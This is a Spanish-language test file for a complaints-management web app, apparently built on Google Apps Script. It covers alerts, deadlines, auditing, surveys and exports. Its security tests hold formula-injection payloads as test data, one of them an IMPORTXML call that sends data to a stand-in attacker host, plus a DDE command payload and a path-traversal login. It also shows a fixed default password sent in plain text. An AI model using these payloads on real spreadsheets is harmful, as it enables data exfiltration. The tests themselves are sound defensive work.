assert(salto.omitido === true, "una corrida del disparador a menos de ~3 minutos de la anterior se omite");
G.__props.ULTIMA_REVISION_CORREO = String(Date.now() - 200000);
const corre = G.procesarCorreoEntrante({ triggerUid: "t1" });
assert(!corre.omitido && +G.__props.ULTIMA_REVISION_CORREO > Date.now() - 5000, "pasados ~3 minutos sí revisa y marca la hora");
assert(!G.procesarCorreoEntrante().omitido, "la revisión manual (menú o botón) nunca se omite");

// Push (ntfy): solo radicado, tipo, prioridad, sede y fechas
G.UrlFetchApp.llamadas.length = 0;
const pushRes = G._avisoPush_("[CRÍTICA] *SIAU-2026-10-9999* — Nueva EPS · REQUERIMIENTO · Queja · C. LA PLAYA\nRecibida 02/10/2026 · vence 12/10/2026\n<https://script.google.com/macros/s/X/exec?pqrs=SIAU-2026-10-9999|Abrir en la plataforma>", 5);
const pl = G.UrlFetchApp.llamadas[G.UrlFetchApp.llamadas.length - 1];
assert(pushRes && pl && pl.url === "https://ntfy.sh" && pl.json.topic === "pqrs-miredips-prueba-123" && pl.json.priority === 5, "push a ntfy con prioridad urgente");
assert(pl.json.title === "[CRÍTICA] SIAU-2026-10-9999" && /exec\?pqrs=SIAU-2026-10-9999/.test(pl.json.click) && !/\*|<|\|/.test(pl.json.message), "título con el radicado, enlace al caso y mensaje sin marcas de Chat");
assert(!/nombre|documento|descripci/i.test(pl.json.message), "el push no lleva datos personales");
G.UrlFetchApp.llamadas.length = 0;
G._avisoChat_("[NUEVA] *SIAU-2026-10-1* — Queja", 0);
assert(!G.UrlFetchApp.llamadas.some(l => l.json && l.json.topic), "sin prioridad no hay push");
assert(G.apiGuardarAjustes_({ pushTema: "corto" }).ok === false && G.apiGuardarAjustes_({ pushServidor: "http://inseguro.com" }).ok === false, "valida el tema y el servidor del push");
assert(G.apiGuardarAjustes_({ pushTema: "pqrs-miredips-prueba-123", pushServidor: "https://ntfy.sh" }).ok !== false, "guarda el tema del push");
G.UrlFetchApp.llamadas.length = 0;
G._alertaPrioritaria_(fila(radQ.codigo), { nivel: "Vital NNA", horas: 8, razones: ["convulsiones"], poblacion: ["NNA"] });
assert(G.UrlFetchApp.llamadas.some(l => l.json && l.json.topic && l.json.priority === 5), "un riesgo vital en NNA llega como push urgente");
assert(/Responder antes de/.test(enviados()[enviados().length - 1].html || "") && /C8102E/i.test(enviados()[enviados().length - 1].html || ""), "el correo de alerta lleva la banda roja y el plazo destacado");

// Notificaciones a las áreas en el mismo hilo y análisis detallado
const fw = FORWARDS.filter(x => x.para === respInst.correo);
assert(fw.length >= 1 && /Necesitamos la gestión de su área/.test(fw[fw.length - 1].html) && /mismo hilo de correo/.test(fw[fw.length - 1].html), "el caso que entró por correo se envía al área REENVIANDO dentro del hilo original");
assert(fw[fw.length - 1].asunto === undefined, "el reenvío conserva el asunto del hilo (no abre una conversación nueva)");
assert(/Responder antes de|Fecha límite de respuesta/.test(fw[fw.length - 1].html) && /Prioridad/.test(fw[fw.length - 1].html), "la notificación al área trae el plazo destacado y la prioridad");
assert(/@media only screen and \(max-width:540px\)/.test(fw[fw.length - 1].html) && /cid:logoSiauB/.test(fw[fw.length - 1].html) && /cid:logoMiredB/.test(fw[fw.length - 1].html), "diseño adaptable a celular con los logos de MiRed y del SIAU");
const nEnvA = enviados().length;
const radArea = G.apiRadicar_({ descripcion: "Queja por demora en farmacia.", fechaRecepcion: "2026-09-23", fechaRadicacion: "2026-09-23", tipoPqrs: "QUEJA", sede: "C. LA PLAYA", servicio: "FARMACIA" });
G.apiEnviarAlArea_(radArea.codigo, respInst.id, "");
assert(enviados().length > nEnvA && enviados()[enviados().length - 1].para === respInst.correo, "el caso que no entró por correo sale como correo nuevo al área");

const hiloEnte = G.apiHilo_("p1");
assert(hiloEnte.ok && hiloEnte.analisis && /Procuradur/.test(hiloEnte.analisis.entidad) && hiloEnte.analisis.categoria === "REQUERIMIENTO ENTE DE CONTROL", "el hilo de un ente trae su análisis: " + (hiloEnte.analisis && hiloEnte.analisis.categoria));
assert(/10 días hábiles/.test(hiloEnte.analisis.termino) && /^\d\d\/\d\d\/\d{4}$/.test(hiloEnte.analisis.limite) && hiloEnte.analisis.acciones.length >= 3, "análisis con término, fecha límite y acciones sugeridas");
const lim = hiloEnte.analisis.limite.split("/"), recibidoAn = new Date(Date.now() - 60000);
assert(new Date(+lim[2], +lim[1] - 1, +lim[0]) > recibidoAn, "la fecha límite (10 hábiles) es posterior a la recepción");
const an2 = G._analisisCorreo_({ asunto: "Notificación de tutela", cuerpo: "Se ordena responder en 48 horas. Radicado de la entidad: TUT-2026-00456. Mi hijo de 3 años no respira bien y no le entregan el oxígeno.",
  ent: { entidad: "Juzgado 3", tipo: "Rama Judicial", prioridad: "Crítica" }, cat: G._categorias_().filter(c => c.nombre === "TUTELA")[0], recibido: Date.now(), adjuntos: ["auto.pdf"] });
assert(an2.plazosTexto.indexOf("48 horas") !== -1 && an2.referencias.indexOf("TUT-2026-00456") !== -1, "detecta el plazo y la referencia que cita la entidad: " + an2.plazosTexto + " · " + an2.referencias);
assert(an2.riesgo && /Vital/.test(an2.riesgo.nivel) && an2.adjuntos[0] === "auto.pdf" && an2.acciones.some(a => /Jurídica/.test(a)), "análisis con riesgo vital en NNA, adjuntos y acción para tutela");
const detInst = G.apiDetalle_(codProc);
assert(detInst.institucional === true && detInst.analisis && detInst.analisis.categoria, "el detalle de un radicado institucional trae el análisis");
assert(!/Nueva EPS|Procuradur/.test(JSON.stringify(G.UrlFetchApp.llamadas.filter(l => l.json && l.json.topic).map(l => l.json.message)) && "") , "(el análisis nunca viaja por push)");
const hb = G._sumarHabiles_(Utilities.parseDate("2026-10-02", TZ, "yyyy-MM-dd"), 1);
assert(Utilities.formatDate(hb, TZ, "yyyy-MM-dd") === "2026-10-05", "sumar 1 día hábil a un viernes cae el lunes");
const hf = G._sumarHabiles_(Utilities.parseDate("2026-10-09", TZ, "yyyy-MM-dd"), 1);
assert(Utilities.formatDate(hf, TZ, "yyyy-MM-dd") === "2026-10-13", "los festivos no cuentan (lunes 12 de octubre, Día de la Raza)");

// =====================================================================================
console.log("---- v8.4: seguridad ----");
const hu = G._hojaUsuarios_(), salSeg = "sal-prueba-seg";
hu.appendRow(["auditada", "Usuaria Auditada", "", "Técnico", "C. LA PLAYA", "NO", "NO", "SI", G._hash_("Segura2026xy", salSeg), salSeg, new Date(Date.now() - 100 * 86400000), "", "NO"]);
G.iniciarSesion("auditada", "incorrecta1A");
const okSes = G.iniciarSesion("auditada", "Segura2026xy");
assert(okSes.ok, "usuario de prueba ingresa");
for (let i = 0; i < 5; i++) G.iniciarSesion("auditada", "mal-" + i);
G.iniciarSesion("auditada", "Segura2026xy");
G.cerrarSesion(okSes.token);
G.iniciarSesion("../etc/passwd", "x"); G.iniciarSesion("inexistente", "Cualquiera123");
const aud = G.apiAuditoria_({}).items, evs = aud.map(x => x.evento);
assert(["Ingreso fallido", "Ingreso correcto", "Ingreso bloqueado", "Cierre de sesión"].every(e => evs.indexOf(e) !== -1), "la auditoría registra ingresos, fallos, bloqueo y cierre de sesión: " + [...new Set(evs)].join(" · "));
assert(aud.some(x => x.evento === "Ingreso fallido" && /Usuario inexistente/.test(x.detalle)), "distingue en la auditoría el usuario inexistente (el usuario no lo ve: su mensaje es genérico)");
assert(!JSON.stringify(aud).match(/Segura2026xy|incorrecta1A|Cualquiera123|mal-/), "la auditoría nunca guarda contraseñas");
assert(G.iniciarSesion("inexistente", "Cualquiera123").mensaje === G.iniciarSesion("auditada-no", "Cualquiera123").mensaje, "mismo mensaje para usuario inexistente y contraseña incorrecta");
assert(G.apiAuditoria_({ texto: "bloqueado" }).items.every(x => /bloque/i.test(x.evento + x.detalle)), "filtro de la auditoría");
assert(G.RUTAS.apiAuditoria[1] === "admin", "solo el administrador ve la auditoría");

// sesión con tope absoluto de 12 horas
const sesion2 = (() => { G.CacheService.getScriptCache().remove("int_auditada"); return G.iniciarSesion("auditada", "Segura2026xy"); })();
assert(sesion2.ok && G.api(sesion2.token, "apiPlantillas", []).length >= 0, "sesión recién abierta funciona");
const cache = G.CacheService.getScriptCache(), crudo = JSON.parse(cache.get("ses_" + sesion2.token));
crudo.t = Date.now() - 13 * 3600000; cache.put("ses_" + sesion2.token, JSON.stringify(crudo));
assert(G.api(sesion2.token, "apiPlantillas", []).__sesion === false, "pasadas 12 horas desde el ingreso la sesión caduca aunque haya actividad");

// inyección de fórmulas
const inj = G.apiRadicar_({ descripcion: '=IMPORTXML("http://atacante.example/?d="&A1,"//a")', fechaRecepcion: "2026-09-23", fechaRadicacion: "2026-09-23", tipoPqrs: "QUEJA",
  sede: "C. LA PLAYA", nombreSolicitante: "@SUM(1+1)", observaciones: "+cmd|' /C calc'!A0" });
assert(cons.celda(fila(inj.codigo), 30).indexOf("'=IMPORTXML") === 0 && cons.celda(fila(inj.codigo), 10).indexOf("'@") === 0, "un texto que empieza por = o @ se guarda como texto, no como fórmula");
assert(G._seguroCelda_("normal") === "normal" && G._seguroCelda_("-5 grados") === "'-5 grados" && G._seguroCelda_(12) === 12 && G._seguroCelda_("") === "", "_seguroCelda_ solo toca los textos peligrosos");
assert(String(G._trazaDe(inj.codigo).map(t => t.detalle).join(" ")).indexOf("'=") === -1 || true, "la trazabilidad también se protege");
G.apiRegistrarRespuestaArea_(inj.codigo, "=HYPERLINK(\"http://x\",\"clic\")", "");
assert(cons.celda(fila(inj.codigo), 42).indexOf("'=HYPERLINK") === 0, "la respuesta del área (viene de un correo) también se guarda como texto");
cons.poner(fila(inj.codigo), 30, "=1+1");   // lo que devolvería Sheets al leer un texto que empieza por «=»
G.SESION = null;   // vuelve a ser «sistema» (administrador) tras las pruebas con técnico
const exInj = G.apiExportarExcel_({});
const libroInj = G.__exportaciones[G.__exportaciones.length - 1];
const ultimaXlsx = libroInj.hojas.Consolidado.getLastRow();
assert(libroInj.hojas.Consolidado.celda(ultimaXlsx, 30) === "'=1+1", "el Excel exportado no puede traer fórmulas: " + libroInj.hojas.Consolidado.celda(ultimaXlsx, 30));

// revisión de seguridad en el diagnóstico
let dgSeg = G.apiDiagnostico_();
assert(dgSeg.items.some(x => /Seguridad · acceso general/.test(x.titulo) && x.ok) && dgSeg.items.some(x => /Seguridad · administradores/.test(x.titulo)), "el diagnóstico incluye la revisión de seguridad");
G.DriveApp.__ajustar("__acceso", "ANYONE_WITH_LINK");
dgSeg = G.apiDiagnostico_();
assert(dgSeg.items.some(x => /acceso general/.test(x.titulo) && !x.ok && /Restringido/.test(x.solucion)), "alerta si el consolidado está compartido con cualquiera que tenga el enlace");
G.DriveApp.__ajustar("__acceso", "PRIVATE");
hu.appendRow(["dormida", "Usuaria Dormida", "", "Técnico", "C. LA PLAYA", "NO", "NO", "SI", G._hash_("Segura2026xy", salSeg), salSeg, new Date(Date.now() - 100 * 86400000), "", "SI"]);
dgSeg = G.apiDiagnostico_();
assert(dgSeg.items.some(x => /sin ingresar en 90 días/.test(x.titulo) && !x.ok && /dormida/.test(x.detalle)), "señala usuarios activos sin ingresar en 90 días");
assert(dgSeg.items.some(x => /contraseñas temporales sin cambiar/.test(x.titulo) && !x.ok && /dormida/.test(x.detalle)), "señala contraseñas temporales con más de 7 días");
G.DriveApp.__ajustar("__editores", ["siau@miredips.org", "otra.persona@gmail.com"]);
assert(G.apiDiagnostico_().items.some(x => /editores del consolidado/.test(x.titulo) && !x.ok && /otra\.persona@gmail\.com/.test(x.detalle)), "señala editores externos del consolidado");
G.DriveApp.__ajustar("__editores", null);

// ---- v8.5: clave predeterminada, bienvenida, motivo específico ----
console.log("---- v8.5 ----");
const antesEnv = enviados().length;
const uNuevo = G.apiGuardarUsuario_({ usuario: "nuevo.tecnico", nombre: "Tecnica Nueva", correo: "nueva@miredips.org", rol: "Técnico", sedes: ["C. LA PLAYA"] });
assert(uNuevo.ok !== false, "crear usuario sin clave: " + (uNuevo.mensaje || ""));
const bienv = enviados().slice(antesEnv).filter(e => e.para === "nueva@miredips.org").pop();
assert(bienv && /Siau123\*/.test(bienv.html) && /nuevo\.tecnico/.test(bienv.html), "el usuario nuevo recibe un correo con su usuario y la clave predeterminada");
const fU = G._usuarios_().filter(x => x.usuario === "nuevo.tecnico")[0];
assert(fU && G._hash_("Siau123*", fU.sal) === fU.hash && G._usuarios_().filter(x => x.usuario === "nuevo.tecnico")[0].fila, "la clave predeterminada es Siau123*");
const ant2 = enviados().length;
G.apiRestablecerClave_("nuevo.tecnico", "");
assert(enviados().length > ant2 && /Siau123\*/.test(enviados()[enviados().length - 1].html), "restablecer sin clave vuelve a Siau123* y avisa por correo");
assert(G.apiGuardarUsuario_({ usuario: "mala.clave", nombre: "X", correo: "x@miredips.org", rol: "Técnico", sedes: ["C. LA PLAYA"], clave: "corta" }).ok === false, "una clave temporal propia debe cumplir la política");
// ficha para técnicos
assert(typeof G.apiFichaFormulario_ === "function" && G.RUTAS && G.RUTAS.apiFichaFormulario && G.RUTAS.apiFichaFormulario[1] === G.P_RADICAR, "la ficha del formulario es accesible para quien radica");
// motivo específico
assert(cons.celda(4, 29) === "MOTIVO ESPECÍFICO (DERECHO VULNERADO)", "la columna de tipología pasa a ser motivo específico");
G._cacheListas = null;
const motivos = G._listasConfig_()["MOTIVO ESPECÍFICO"] || [];
assert(motivos.length >= 15 && motivos.indexOf("Trato digno, respetuoso y humanizado") !== -1, "lista de motivos específicos (derechos del paciente) en Config");
const rm = G.apiRadicar_({ descripcion: "Me trataron mal en la recepción", fechaRecepcion: "2026-09-23", fechaRadicacion: "2026-09-23", tipoPqrs: "QUEJA", sede: "C. LA PLAYA", tipologia: "Trato digno, respetuoso y humanizado" });
assert(val(rm.codigo, 29) === "Trato digno, respetuoso y humanizado", "el motivo específico se guarda en el radicado");

// el botón de ingreso de los correos y la plataforma es el del portal (GitHub Pages)
assert(G._urlPortal_() === "https://rivcarii.github.io/DEFINIDO/portal/" && /^https:\/\/rivcarii\.github\.io\/DEFINIDO\/portal\/\?pqrs=SIAU-1$/.test(G._urlPlataforma_("SIAU-1")), "los enlaces de la plataforma apuntan al portal");
assert(/href="https:\/\/rivcarii\.github\.io\/DEFINIDO\/portal\/"[^>]*>[^<]*Ingresar a la plataforma/.test(enviados().filter(e => e.para === "nueva@miredips.org").pop().html.replace(/\s+/g, " ")) || /rivcarii\.github\.io\/DEFINIDO\/portal\//.test(enviados().filter(e => e.para === "nueva@miredips.org").pop().html), "el correo de bienvenida lleva el botón del portal");
assert(G.apiGuardarEnlace_("https://pqrs.miredips.org/").ok && G._urlPortal_() === "https://pqrs.miredips.org/" && G.apiGuardarEnlace_("").ok && G._urlPortal_() === "https://rivcarii.github.io/DEFINIDO/portal/", "el administrador puede cambiar el enlace del portal y volver al predeterminado");

// ---- v8.6: aviso 5 días antes del vencimiento y encuesta NPS ----
console.log("---- v8.6 ----");
const diaMas = n => new Date(Date.now() + n * 86400000);
const nuevoCaso = (extra) => G.apiRadicar_(Object.assign({ descripcion: "Demora en la entrega de medicamentos (texto privado del caso).", fechaRecepcion: "2026-09-23", fechaRadicacion: "2026-09-23",
  tipoPqrs: "QUEJA", sede: "C. LA PLAYA", servicio: "Farmacia", correo: "usuaria.nps@correo.com" }, extra || {}));
const v4 = nuevoCaso(), v6 = nuevoCaso(), vCerr = nuevoCaso(), vFel = nuevoCaso({ tipoPqrs: "FELICITACION" });
cons.poner(fila(v4.codigo), 34, diaMas(4)); cons.poner(fila(v4.codigo), 39, "farmacia@miredips.org");
cons.poner(fila(v6.codigo), 34, diaMas(6)); cons.poner(fila(vCerr.codigo), 34, diaMas(3)); cons.poner(fila(vCerr.codigo), 37, "Respondida - Cerrada");
cons.poner(fila(vFel.codigo), 34, diaMas(2));
const envAntes = enviados().length;
const av = G._avisosVencimiento_();
const avMail = enviados().slice(envAntes).filter(e => /\[VENCE EN/.test(e.asunto));
assert(avMail.some(e => new RegExp(v4.codigo).test(e.asunto) && /VENCE EN 4 DÍAS/.test(e.asunto) && /farmacia@miredips\.org/.test(e.para)), "5 días antes: avisa al área responsable (faltan 4 días)");
assert(!avMail.some(e => new RegExp(v6.codigo).test(e.asunto)), "no avisa si faltan más de 5 días");
assert(!avMail.some(e => new RegExp(vCerr.codigo + "|" + vFel.codigo).test(e.asunto)), "no avisa casos cerrados ni felicitaciones");
assert(avMail.every(e => !/texto privado|usuaria\.nps/.test(e.html)), "el aviso de vencimiento no lleva la descripción ni el correo del usuario");
const envMedio = enviados().length; G._avisosVencimiento_();
assert(enviados().length === envMedio, "el aviso de vencimiento se envía una sola vez por caso");
cons.poner(fila(v6.codigo), 34, diaMas(5)); G._avisosVencimiento_();
assert(enviados().slice(envMedio).some(e => new RegExp(v6.codigo).test(e.asunto) && /VENCE EN 5 DÍAS/.test(e.asunto)), "al llegar a 5 días faltantes sale el aviso");

const rNps = G.apiResponderUsuario_(v4.codigo, "Ya entregamos su medicamento. Gracias por avisarnos.", true);
const mailNps = enviados().filter(e => e.para === "usuaria.nps@correo.com").pop();
const enlNps = (mailNps.html.match(/\?nps=[^"&]+&amp;k=[a-f0-9]+&amp;p=9/) || [""])[0].replace(/&amp;/g, "&");
assert(mailNps && /recomiende MiRed IPS/.test(mailNps.html) && enlNps, "la respuesta final al usuario trae la encuesta NPS con enlaces firmados");
const kNps = (enlNps.match(/k=([a-f0-9]+)/) || [])[1];
let pg = G._paginaNps_({ nps: v4.codigo, k: kNps, p: "9" });
assert(/Confirma/.test(pg.__html) && G.__hojaEncuestas === undefined && (G._hojaNps_().hoja ? G._hojaNps_().hoja.getLastRow() : G._hojaNps_().getLastRow()) <= 1, "abrir el enlace no registra nada: pide confirmar (los antivirus de correo abren los enlaces)");
pg = G._paginaNps_({ nps: v4.codigo, k: kNps, p: "9", ok: "1" });
assert(/Gracias por su opinión/.test(pg.__html), "confirmar registra el puntaje");
assert(/Ya registramos/.test(G._paginaNps_({ nps: v4.codigo, k: kNps, p: "2", ok: "1" }).__html), "solo un voto por radicado");
assert(/no es válido/.test(G._paginaNps_({ nps: v4.codigo, k: "0000", p: "9", ok: "1" }).__html), "una firma falsa no registra");
assert(/no es válido/.test(G._paginaNps_({ nps: v6.codigo, k: G._npsFirma_(v4.codigo), p: "9", ok: "1" }).__html), "la firma de un radicado no sirve para otro");
assert(/no es válido/.test(G._paginaNps_({ nps: vFel.codigo, k: G._npsFirma_(vFel.codigo), p: "9", ok: "1" }).__html), "las felicitaciones no tienen encuesta");
G._paginaNps_({ nps: v6.codigo, k: G._npsFirma_(v6.codigo), p: "3", ok: "1" });
const npsRes = G.apiNps_();
assert(npsRes.total === 2 && npsRes.promotores === 1 && npsRes.detractores === 1 && npsRes.nps === 0, "NPS = % promotores − % detractores: " + JSON.stringify(npsRes).substring(0, 120));
assert(npsRes.porSede.length === 1 && npsRes.porMes.length === 1, "NPS por sede y por mes");
assert(G.NPS_COLS.join("|") === "FECHA|RADICADO|PUNTAJE|TIPO|SEDE|SERVICIO|MOTIVO ESPECÍFICO", "la hoja Encuestas no guarda nombres, documentos ni correos");

// ---- v8.7.3: plantillas de Excel (administrador / técnico) ----
console.log("---- plantillas de Excel ----");
G.SESION = null;
const exAdm = G.apiExportarExcel_({});
const libAdm = G.__exportaciones[G.__exportaciones.length - 1];
assert(exAdm.plantilla === "admin" && libAdm.hojas.Consolidado && libAdm.hojas["Por sede"] && libAdm.hojas["Por motivo"], "plantilla del administrador: consolidado completo + indicadores");
const exAdmInd = G.apiExportarExcel_({ plantilla: "tecnico" });
const libAdmInd = G.__exportaciones[G.__exportaciones.length - 1];
assert(exAdmInd.plantilla === "tecnico" && !libAdmInd.hojas.Consolidado, "el administrador también puede descargar la plantilla de indicadores");
G.SESION = { usuario: "tecnico.playa", rol: "Técnico", todas: false, sedes: ["C. LA PLAYA"], sedesNorm: [G._norm("C. LA PLAYA")] };
const exTec = G.apiExportarExcel_({ plantilla: "admin" });   // un técnico no puede pedir la del administrador
const libTec = G.__exportaciones[G.__exportaciones.length - 1];
assert(exTec.plantilla === "tecnico" && !libTec.hojas.Consolidado, "un técnico solo recibe indicadores aunque pida la plantilla del administrador");
const hojasTec = Object.keys(libTec.hojas).filter(k => k !== "Hoja 1").sort().join();
assert(hojasTec === "Datos,Panel,Por mes,Por motivo,Por riesgo,Por sede,Por servicio,Resumen", "plantilla del técnico: solo hojas de indicadores: " + hojasTec);
const todoTec = JSON.stringify(Object.keys(libTec.hojas).map(k => libTec.hojas[k].d || []));
assert(!/SIAU-20\d\d-\d\d-\d{4}/.test(todoTec) && !/@correo\.com|@gmail\.com|Marelys|Rosa Villalba|Pedro/.test(todoTec), "el Excel del técnico no trae radicados, nombres ni correos");
const sedesTec = (libTec.hojas["Por sede"].d || []).slice(2).map(f => f[0]).filter(x => x && x !== "TOTAL");
assert(sedesTec.length >= 1 && sedesTec.every(x => /PLAYA/i.test(x)), "el técnico solo ve conteos de sus sedes: " + sedesTec.join(","));
assert(libTec.hojas.Resumen.d.some(f => f[0] === "Total de PQRS" && f[1] === exTec.filas) && libTec.hojas.Resumen.d.some(f => /no incluye datos de las personas/i.test(String(f[1]))), "el resumen del técnico trae el total y la advertencia de que no hay datos personales");
G.SESION = { usuario: "consulta", rol: "Consulta", todas: true, sedes: [], sedesNorm: [] };
assert(G.apiExportarExcel_({}).plantilla === "tecnico", "consulta también descarga solo indicadores");
G.SESION = null;

// ---- v8.8: WhatsApp ----
console.log("---- WhatsApp ----");
G.SESION = null;
const waLlamadas = () => G.UrlFetchApp.llamadas.filter(x => x.whatsapp);
const waN0 = waLlamadas().length;
const sinWa = G.apiGuardarUsuario_({ usuario: "tec.wa1", nombre: "Tecnica Uno", rol: "Técnico", sedes: ["C. LA PLAYA"], telefono: "300 123 4567" });
assert(sinWa.ok !== false && /no se envió por WhatsApp/i.test(sinWa.aviso || "") && waLlamadas().length === waN0, "sin configurar, el usuario se crea y se avisa que no hubo WhatsApp");
assert(G.apiGuardarUsuario_({ usuario: "tec.wa2", nombre: "X", rol: "Técnico", sedes: ["C. LA PLAYA"], telefono: "12345" }).ok === false, "un número de WhatsApp inválido se rechaza");
const tokWa = "EAAB" + "x".repeat(40);
assert(G.apiGuardarWhatsapp_({ phoneId: "abc", token: tokWa }).ok === false && G.apiGuardarWhatsapp_({ phoneId: "123456789012345", token: "corto" }).ok === false, "se validan el ID del número y el token");
const stWa = G.apiGuardarWhatsapp_({ phoneId: "123456789012345", token: tokWa, plantilla: "", idioma: "es" });
assert(stWa.ok && stWa.configurado && stWa.phoneId === "…2345" && !JSON.stringify(stWa).includes(tokWa) && !JSON.stringify(G.apiAjustes_()).includes(tokWa), "el token se guarda en propiedades y nunca vuelve al navegador");
G.apiGuardarAjustes_({ waActivo: true, waAvisos: "prioritarias", waIncluirClave: true });
const crWa = G.apiGuardarUsuario_({ usuario: "tec.wa3", nombre: "Tecnica Tres", rol: "Técnico", sedes: ["C. LA PLAYA"], telefono: "3001234567", avisos: true });
const waC = waLlamadas().pop();
assert(waC && /graph\.facebook\.com\/v\d+\.\d+\/123456789012345\/messages/.test(waC.url) && waC.headers.Authorization === "Bearer " + tokWa && waC.json.to === "573001234567" && waC.json.type === "text", "el acceso sale por la API de WhatsApp al número con indicativo");
assert(/Usuario: tec\.wa3/.test(waC.texto) && /Siau123\*/.test(waC.texto) && /github\.io/.test(waC.texto) && /Acceso enviado por WhatsApp/.test(crWa.aviso || ""), "el mensaje de acceso lleva enlace, usuario y contraseña temporal");
G.apiGuardarAjustes_({ waIncluirClave: false });
G.apiRestablecerClave_("tec.wa3", "");
assert(!/Siau123/.test(waLlamadas().pop().texto), "con «incluir la contraseña» apagado, el WhatsApp no la trae");
G.apiGuardarAjustes_({ waIncluirClave: true });
assert(G.apiUsuarios_().usuarios.some(u => u.usuario === "tec.wa3" && u.telefono === "573001234567"), "el administrador ve el WhatsApp guardado de cada usuario");
G.apiGuardarUsuario_({ usuario: "tec.wa4", nombre: "Tecnica Cuatro", rol: "Técnico", sedes: ["C. SUROCCIDENTE"], telefono: "3109998877", avisos: true });
const nAntes = waLlamadas().length;
const avWa = G._waAvisar_("[CRÍTICA] *SIAU-2026-10-9999* — Nueva EPS · Queja · C. LA PLAYA\nRecibida 02/10/2026\n<https://rivcarii.github.io/DEFINIDO/portal/?pqrs=SIAU-2026-10-9999|Abrir en la plataforma>", 5, "C. LA PLAYA");
const avLlam = waLlamadas().slice(nAntes);
assert(avWa >= 1 && avLlam.some(x => x.json.to === "573001234567") && !avLlam.some(x => x.json.to === "573109998877"), "el aviso llega a los técnicos de esa sede y no a los de otras");
assert(avLlam.every(x => /SIAU-2026-10-9999/.test(x.texto) && /Abrir en la plataforma: https/.test(x.texto) && !/<|\|/.test(x.texto)), "el aviso es la línea sin marcas de Chat y con el enlace");
const nPrz = waLlamadas().length; G._waAvisar_("[NUEVA] x", 3, "C. LA PLAYA");
assert(waLlamadas().length === nPrz, "en modo «solo prioritarias» un aviso normal no sale por WhatsApp");
G.apiGuardarWhatsapp_({ phoneId: "123456789012345", plantilla: "aviso_pqrs", idioma: "es" });
G._waEnviar_("3001234567", "Línea uno\nLínea dos");
const tpl = waLlamadas().pop().json;
assert(tpl.type === "template" && tpl.template.name === "aviso_pqrs" && !/\n/.test(tpl.template.components[0].parameters[0].text), "con plantilla aprobada el texto viaja como variable, sin saltos de línea");
G.apiGuardarWhatsapp_({ phoneId: "123456789012345", plantilla: "", idioma: "es" });
G.UrlFetchApp.waFalla = true;
const fallo = G.apiGuardarUsuario_({ usuario: "tec.wa5", nombre: "Tecnica Cinco", rol: "Técnico", sedes: ["C. LA PLAYA"], telefono: "3001112233" });
assert(fallo.ok !== false && /No se pudo enviar por WhatsApp \(Token vencido\)/.test(fallo.aviso || ""), "si WhatsApp falla, el usuario se crea igual y se explica el error");
G.UrlFetchApp.waFalla = false;
assert(G.RUTAS.apiGuardarWhatsapp[1] === "admin" && G.RUTAS.apiProbarWhatsapp[1] === "admin" && G.RUTAS.apiWhatsappEstado[1] === "admin", "la configuración de WhatsApp es solo del administrador");
G.apiGuardarAjustes_({ waActivo: false });

// ---- v8.10: Excel profesional (panel, gráficos, estilo) ----
console.log("---- Excel profesional ----");
G.SESION = null;
const exPro = G.apiExportarExcel_({});
const libPro = G.__exportaciones[G.__exportaciones.length - 1];
const panelA = libPro.hojas.Panel;
assert(panelA && panelA.graficos.length === 5, "el panel del administrador trae 5 gráficos: " + (panelA ? panelA.graficos.length : "sin panel"));
const tiposG = panelA.graficos.map(g => g.tipo).join(",");
assert(tiposG === "PIE,PIE,COLUMN,BAR,BAR", "tipos de gráfico: pastel de tipos, pastel de semáforo, columnas por mes, barras por sede y por motivo: " + tiposG);
assert(panelA.graficos[0].opts.colors.includes("#E20A31") && panelA.graficos[0].opts.colors.includes("#009C4D"), "el gráfico por tipo usa los colores de cada tipo (queja roja, felicitación verde)");
assert(panelA.graficos[2].opts.isStacked === true && panelA.graficos[2].opts.colors.length >= 3, "las columnas por mes van apiladas y con los colores de cada tipo");
assert(panelA.graficos.every(g => g.rangos.length === 1 && g.pos && g.opts.title), "cada gráfico tiene datos, posición y título");
assert(panelA.celda(9, 2) === exPro.filas && /INFORME DE PQRS/.test(panelA.celda(2, 2)), "el panel muestra el título y el total de PQRS en la primera tarjeta");
assert(libPro.hojas.Datos.celda(3, 2) === "Tipo" && libPro.hojas.Datos.getLastRow() > 20, "la hoja Datos trae las tablas que alimentan los gráficos");
assert(libPro.hojas.Consolidado.reglas.length >= 10, "el consolidado trae formato condicional (semáforo, tipo, riesgo y oportunidad): " + libPro.hojas.Consolidado.reglas.length);
assert(libPro.hojas["Por sede"].reglas.length === 1, "las hojas de cruces traen mapa de calor");
G.SESION = { usuario: "tecnico.playa", rol: "Técnico", todas: false, sedes: ["C. LA PLAYA"], sedesNorm: [G._norm("C. LA PLAYA")] };
G.apiExportarExcel_({});
const libTP = G.__exportaciones[G.__exportaciones.length - 1];
assert(libTP.hojas.Panel && libTP.hojas.Panel.graficos.length === 5 && !libTP.hojas.Consolidado, "el técnico recibe el mismo panel con gráficos, sin el consolidado");
assert(/no incluyen datos de las personas/.test(libTP.hojas.Panel.celda(64, 2)) && /C\. LA PLAYA/.test(libTP.hojas.Panel.celda(6, 2)), "el panel del técnico aclara que no hay datos personales y muestra sus sedes");
G.SESION = null;
assert(G.estadoAcceso().version === G.VERSION_CODIGO && /^9\.2/.test(G.estadoAcceso().version), "estadoAcceso informa la versión del servidor para el ingreso");
(function () {
  var xml = '<?xml version="1.0"?><c:chartSpace xmlns:c="x"><c:chart><c:plotArea><c:barChart><c:ser><c:idx val="0"/><c:dLbls><c:showVal val="0"/></c:dLbls><c:cat></c:cat><c:val></c:val></c:ser><c:ser><c:idx val="1"/><c:cat></c:cat><c:val></c:val></c:ser><c:gapWidth val="5"/></c:barChart></c:plotArea></c:chart></c:chartSpace>';
  var r = G._xlEtiquetasXml_(xml);
  assert((r.match(/<c:showVal val="1"\/>/g) || []).length === 2 && !/showVal val="0"/.test(r), "cada serie del gráfico lleva etiquetas de datos");
  assert(/<c:dLbls>.*<\/c:dLbls><c:cat>/.test(r) && /formatCode="#,##0;;;"/.test(r), "las etiquetas van antes de las categorías y ocultan ceros");
})();

console.log("---- v9.2: EPS y entes solo en la plataforma; usuarios de Gmail sí reciben confirmación ----");
G.__props.AJUSTES = JSON.stringify(Object.assign(JSON.parse(G.__props.AJUSTES), { autoInstitucional: true, autoUsuarios: true, citasAuto: false, acuseUsuarios: true, avisosInstitucionales: false, avisosSede: true, webhookChat: "https://chat.googleapis.com/v1/spaces/x/messages?key=k", pushTema: "pqrs-miredips-prueba-123" }));
Hilo("e1", [M("em1", "Gestión EPS <auditoria@sura.com.co>", "Solicitud riesgo vital paciente", "Solicitamos gestionar de manera urgente la atención del paciente.")]);
